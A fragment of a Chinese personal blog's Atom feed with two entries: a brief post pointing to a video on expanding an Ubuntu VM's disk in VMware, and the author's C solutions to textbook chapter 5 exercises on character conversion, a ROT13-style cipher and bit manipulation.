  <entry>
    <title>ubuntu虚拟机磁盘拓展</title>
    <link href="https://www.rgzzplus.com/2022/03/29/ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E6%8B%93%E5%B1%95/"/>
    <id>https://www.rgzzplus.com/2022/03/29/ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E6%8B%93%E5%B1%95/</id>
    <published>2022-03-29T14:34:19.000Z</published>
    <updated>2022-03-29T14:40:31.841Z</updated>
    
    <content type="html"><![CDATA[<p>今天，我在 VMware 上使用 ubuntu 虚拟机时碰到了一个很棘手的问题—磁盘空间不够用了，我想很多使用 ubuntu 的小伙伴或多或少都会碰到这种情况。</p><p>然而，我搜遍了 CSDN 和百度却没有找到答案，让我很是苦恼，最终还是在B站上发现了大佬的视频，帮我解决了磁盘拓展问题。感谢<a href="https://space.bilibili.com/24100898">迪迪亚与前端与Linux</a>大佬。</p><p><a href="https://www.bilibili.com/video/BV1vv411e7kp?p=1">磁盘拓展视频链接</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天，我在 VMware 上使用 ubuntu 虚拟机时碰到了一个很棘手的问题—磁盘空间不够用了，我想很多使用 ubuntu 的小伙伴或多或少都会碰到这种情况。&lt;/p&gt;
&lt;p&gt;然而，我搜遍了 CSDN 和百度却没有找到答案，让我很是苦恼，最终还是在B站上发现了大佬的视频，帮</summary>
      
    
    
    
    <category term="经验交流" scheme="https://www.rgzzplus.com/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/"/>
    
    
    <category term="ubuntu" scheme="https://www.rgzzplus.com/tags/ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>C和指针编程题--第五章</title>
    <link href="https://www.rgzzplus.com/2022/03/26/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E4%BA%94%E7%AB%A0/"/>
    <id>https://www.rgzzplus.com/2022/03/26/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E4%BA%94%E7%AB%A0/</id>
    <published>2022-03-26T11:33:07.000Z</published>
    <updated>2022-03-26T11:13:53.716Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第五章编程题59"><a class="markdownIt-Anchor" href="#第五章编程题59"></a> 第五章—编程题5.9</h1><h2 id="题目1"><a class="markdownIt-Anchor" href="#题目1"></a> 题目1</h2><p><img src="/2022/03/26/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E4%BA%94%E7%AB%A0/image-20220322202903197.png" alt="1"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 编译环境：vs2022</span></span><br><span class="line"><span class="comment">* 题目简介：输出字符串大写形式</span></span><br><span class="line"><span class="comment">* 时间：2022/3/22</span></span><br><span class="line"><span class="comment">* 分析：有两种方案：</span></span><br><span class="line"><span class="comment">*1.将标准输入复制到标准输出中，然后在转换大写，</span></span><br><span class="line"><span class="comment">*但是，它只能在使用ASCII码的机器上运行</span></span><br><span class="line"><span class="comment">*2.使用tolower函数</span></span><br><span class="line"><span class="comment">* 总结：</span></span><br><span class="line"><span class="comment">* 改进：</span></span><br><span class="line"><span class="comment">* 作者：人工智障plus</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 将标准输入复制到标准输出中，将所有大写字母转换为小写字母。</span></span><br><span class="line"><span class="comment">* 如果参数并非大写字母，tolower 函数将不修改，直接返回它的值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 方法2：</span></span><br><span class="line"><span class="comment">int main(int argc, char *argv[])</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">int ch;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">while( (ch = getchar()) != EOF )</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">putchar( tolower( ch ) );</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法1：</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ch;</span><br><span class="line"><span class="keyword">while</span>( (ch = getchar() ) != EOF)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( ch &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;Z&#x27;</span> )</span><br><span class="line">ch += <span class="string">&#x27;a&#x27;</span> - <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="built_in">putchar</span>( ch );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目2"><a class="markdownIt-Anchor" href="#题目2"></a> 题目2</h2><p><img src="/2022/03/26/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E4%BA%94%E7%AB%A0/image-20220322203009335.png" alt="2"></p><p><img src="/2022/03/26/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E4%BA%94%E7%AB%A0/image-20220322203028563.png" alt="2-1"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 编译环境：vs2022</span></span><br><span class="line"><span class="comment">* 题目简介：加密字母</span></span><br><span class="line"><span class="comment">* 时间：2022/3/22</span></span><br><span class="line"><span class="comment">* 分析：字符实际上是较小的整形值，</span></span><br><span class="line"><span class="comment">*加密实际上是改变这个整型值</span></span><br><span class="line"><span class="comment">* 总结：</span></span><br><span class="line"><span class="comment">* 改进：</span></span><br><span class="line"><span class="comment">* 作者：人工智障plus</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ch;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>( (ch = getchar()) != EOF )</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//加密</span></span><br><span class="line"><span class="keyword">if</span>( (<span class="string">&#x27;a&#x27;</span>&lt;=ch)&amp;&amp;(ch&lt;=<span class="string">&#x27;m&#x27;</span>) )</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">putchar</span>(ch+<span class="number">13</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( (<span class="string">&#x27;m&#x27;</span>&lt;ch)&amp;&amp;(ch&lt;=<span class="string">&#x27;z&#x27;</span>) )</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">putchar</span>(ch-<span class="string">&#x27;m&#x27;</span>+<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( (<span class="string">&#x27;A&#x27;</span>&lt;=ch)&amp;&amp;(ch&lt;=<span class="string">&#x27;M&#x27;</span>) )</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">putchar</span>(ch+<span class="number">13</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( (<span class="string">&#x27;M&#x27;</span>&lt;ch)&amp;&amp;(ch&lt;=<span class="string">&#x27;Z&#x27;</span>) )</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">putchar</span>(ch-<span class="string">&#x27;M&#x27;</span>+<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目3"><a class="markdownIt-Anchor" href="#题目3"></a> 题目3</h2><p><img src="/2022/03/26/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E4%BA%94%E7%AB%A0/image-20220322203143954.png" alt="3"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 编译环境：vs2022</span></span><br><span class="line"><span class="comment">* 题目简介：变换二进制</span></span><br><span class="line"><span class="comment">* 时间：2022/3/22</span></span><br><span class="line"><span class="comment">* 分析：可以设立一个临时值，保存左移位的值</span></span><br><span class="line"><span class="comment">*然后将右移位的值放在原变量中，然后把它们相加</span></span><br><span class="line"><span class="comment">* 总结：通过移位和+，来变换它的前后值</span></span><br><span class="line"><span class="comment">* 改进：打印二进制</span></span><br><span class="line"><span class="comment">* 作者：人工智障plus</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">reverse_bits</span><span class="params">( <span class="type">unsigned</span> <span class="type">int</span> value )</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_bits</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> value)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> value = <span class="number">25</span>;</span><br><span class="line">value=reverse_bits(value);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%u\n&quot;</span>,value);</span><br><span class="line">print_bits(value);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">reverse_bits</span><span class="params">( <span class="type">unsigned</span> <span class="type">int</span> value )</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> answer;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">answer = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 只要i不是0就继续进行。这就使得循环与机器的字长无关，</span></span><br><span class="line"><span class="comment">* 从而避免了可移植性问题</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">for</span>( i = <span class="number">1</span>; i != <span class="number">0</span>; i &lt;&lt;= <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 把旧的answer左移1位，位下一个位留下空间</span></span><br><span class="line"><span class="comment">* 如果value的最后一位是1，answer就与1进行OR操作</span></span><br><span class="line"><span class="comment">* 然后将value右移至下一位</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">answer = answer &lt;&lt; <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>( value &amp; <span class="number">1</span> )</span><br><span class="line">answer = answer | <span class="number">1</span>;</span><br><span class="line">value = value &gt;&gt; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> answer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将value二进制形式打印出来</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_bits</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> len = <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">int</span>) * <span class="number">8</span>;</span><br><span class="line"><span class="type">int</span> idx;</span><br><span class="line"><span class="type">int</span> bit;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span>(idx = <span class="number">1</span>; idx &lt;= len; idx++)&#123;</span><br><span class="line"><span class="comment">//从左往右，通过位偏移后，和1取与运算，打印bit位的值</span></span><br><span class="line">bit = <span class="number">1</span> &amp; (value &gt;&gt; (len - idx));</span><br><span class="line"> </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, bit);</span><br><span class="line"><span class="comment">//四位一空，方便阅读</span></span><br><span class="line"><span class="keyword">if</span>(idx % <span class="number">4</span> == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="题目4"><a class="markdownIt-Anchor" href="#题目4"></a> 题目4</h2><p><img src="/2022/03/26/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E4%BA%94%E7%AB%A0/image-20220322203218456.png" alt="4"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 编译环境：vs2022</span></span><br><span class="line"><span class="comment">* 题目简介：位数组</span></span><br><span class="line"><span class="comment">* 时间：2022/3/23</span></span><br><span class="line"><span class="comment">* 分析：</span></span><br><span class="line"><span class="comment">* 总结：字符&#x27;1&#x27;,&#x27;0&#x27;无法打印，所以是方框</span></span><br><span class="line"><span class="comment">* 改进：</span></span><br><span class="line"><span class="comment">* 作者：人工智障plus</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_bit</span><span class="params">( <span class="type">char</span> bit_array[], <span class="type">unsigned</span> bit_number )</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">clear_bit</span><span class="params">( <span class="type">char</span> bit_array[], <span class="type">unsigned</span> bit_number )</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">assign_bit</span><span class="params">( <span class="type">char</span> bit_array[], <span class="type">unsigned</span> bit_number, <span class="type">int</span> value )</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">test_bit</span><span class="params">( <span class="type">char</span> bit_array[], <span class="type">unsigned</span> bit_number )</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> <span class="built_in">array</span>[<span class="number">10</span>]=&#123;<span class="string">&quot;000000000&quot;</span>&#125;;</span><br><span class="line">set_bit(<span class="built_in">array</span>,<span class="number">0</span>);</span><br><span class="line">set_bit(<span class="built_in">array</span>,<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="built_in">array</span>);</span><br><span class="line">clear_bit(<span class="built_in">array</span>,<span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="built_in">array</span>);</span><br><span class="line">assign_bit(<span class="built_in">array</span>,<span class="number">2</span>,<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="built_in">array</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_bit</span><span class="params">( <span class="type">char</span> bit_array[], <span class="type">unsigned</span> bit_number )</span></span><br><span class="line">&#123;</span><br><span class="line">bit_array[bit_number] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">clear_bit</span><span class="params">( <span class="type">char</span> bit_array[], <span class="type">unsigned</span> bit_number )</span></span><br><span class="line">&#123;</span><br><span class="line">bit_array[bit_number] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">assign_bit</span><span class="params">( <span class="type">char</span> bit_array[], <span class="type">unsigned</span> bit_number, <span class="type">int</span> value )</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(value == <span class="number">0</span>) </span><br><span class="line">bit_array[bit_number] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">bit_array[bit_number] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">test_bit</span><span class="params">( <span class="type">char</span> bit_array[], <span class="type">unsigned</span> bit_number )</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(bit_array[bit_number] != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="题目5"><a class="markdownIt-Anchor" href="#题目5"></a> 题目5</h2><p><img src="/2022/03/26/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E4%BA%94%E7%AB%A0/image-20220322203301130.png" alt="5"></p><p>​<img src="/2022/03/26/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E4%BA%94%E7%AB%A0/image-20220322203316084.png" alt="5-1"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 编译环境：vs2022</span></span><br><span class="line"><span class="comment">* 题目简介：指定位储存</span></span><br><span class="line"><span class="comment">* 时间：2022/3/23</span></span><br><span class="line"><span class="comment">* 分析：见提示</span></span><br><span class="line"><span class="comment">* 总结：用或运算来置一创建掩码。</span></span><br><span class="line"><span class="comment">* 改进：</span></span><br><span class="line"><span class="comment">* 作者：人工智障plus</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">store_bit_field</span><span class="params">(<span class="type">int</span> original_value, <span class="type">int</span> value_to_store, <span class="type">unsigned</span> starting_bit, <span class="type">unsigned</span> ending_bit)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line">result = store_bit_field(<span class="number">0xffff</span>, <span class="number">0x123</span>, <span class="number">13</span>, <span class="number">9</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%0x\n&quot;</span>, result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">store_bit_field</span><span class="params">(<span class="type">int</span> original_value, <span class="type">int</span> value_to_store, <span class="type">unsigned</span> starting_bit, <span class="type">unsigned</span> ending_bit)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> mask = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> tmp = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//制作对应的起始位置掩码</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> idx = starting_bit; idx &gt;= ending_bit; idx--)</span><br><span class="line">&#123;</span><br><span class="line">tmp = <span class="number">1</span>&lt;&lt; idx;</span><br><span class="line">mask |= tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过掩码将original_value 对应的范围内置0</span></span><br><span class="line">original_value &amp;= ~mask;</span><br><span class="line"><span class="comment">//将value_to_store对齐起始和结束位置</span></span><br><span class="line">value_to_store  &lt;&lt;= ending_bit;</span><br><span class="line"><span class="comment">//value_to_store中将超出范围的部分置0</span></span><br><span class="line">value_to_store &amp;= mask;</span><br><span class="line"><span class="comment">//将值和original_value取或保存值</span></span><br><span class="line">original_value |= value_to_store;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> original_value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第五章编程题59&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#第五章编程题59&quot;&gt;&lt;/a&gt; 第五章—编程题5.9&lt;/h1&gt;
&lt;h2 id=&quot;题目1&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#题目1&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="题库/作业" scheme="https://www.rgzzplus.com/categories/%E9%A2%98%E5%BA%93-%E4%BD%9C%E4%B8%9A/"/>
    
    
    <category term="C和指针" scheme="https://www.rgzzplus.com/tags/C%E5%92%8C%E6%8C%87%E9%92%88/"/>
    
  </entry>
  
</feed>
